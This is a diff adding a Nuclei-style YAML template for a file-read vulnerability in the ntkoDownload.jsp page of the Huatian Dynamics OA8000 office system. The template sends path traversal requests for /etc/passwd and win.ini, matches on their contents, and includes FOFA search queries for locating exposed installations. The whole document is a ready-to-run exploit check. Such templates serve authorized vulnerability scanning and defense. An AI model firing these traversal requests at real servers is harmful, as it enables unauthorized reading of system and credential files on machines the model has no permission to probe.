@@ -1,0 +1,33 @@
+id: huatian-oa-ntkoDownload-fileread-2
+info:
+  name: 华天动力 ntkoDownload.jsp - fileread
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://github.com/zan8in/afrog/blob/c3a0f8662adc69f115637c506f94147a31586131/pocs/afrog-pocs/vulnerability/huatiandongli-ntkodownload-fileread.yaml#L17
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: app="华天动力-OA8000" || body="/OAapp/WebObjects/OAapp.woa" || body="/OAapp/htpages/app"
+    hunter-query: demo
+    tips:
+    repair:
+    version:
+  tags: 2024,fileread,huatian,oa
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/OAapp/jsp/trace/ntkodownload.jsp?filename=../../../../../../../etc/passwd"
+      - "{{BaseURL}}/OAapp/jsp/trace/ntkodownload.jsp?filename=../../../../../../../c:/windows/win.ini"
+
+    stop-at-first-match: true
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
+          - "\\[(font|extension|file)s\\]"
+        condition: or
